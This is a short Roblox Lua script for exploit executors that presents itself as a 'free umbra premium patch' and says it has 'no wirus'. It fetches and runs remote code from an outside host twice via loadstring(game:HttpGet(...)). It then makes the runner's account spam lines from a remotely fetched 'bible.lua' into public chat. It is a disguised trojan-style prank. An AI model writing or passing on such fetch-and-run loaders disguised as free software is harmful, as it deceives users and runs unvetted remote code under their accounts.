local Inst = loadstring(game:HttpGet("https://ave.is-a.dev/umbra/src/Inst"))()

local txt = Inst.new("TextLabel", Inst.newProtectedScreenGui({
	Name = "."
}), {
	Name = ".",
	Position = UDim2.new(0, 0, 0, 0),
	Size = UDim2.new(1, 0, 1, 0),
	RichText = true,
	TextSize = 18,
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	TextColor3 = Color3.new(1, 1, 1),
	TextTransparency = 0,
	Font = Enum.Font.GothamBold,
	Text = "loading free umbra premium patch...<br/><br/>free punjabi no wirus....<br/><br/>uwu...."
})

for i, v in pairs( (loadstring(game:HttpGet("https://ave.is-a.dev/umbra-premium-free-real/bible.lua"))()) ) do
	if txt then txt:Destroy() txt=nil end
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
	print(v)
	wait(1.5)
end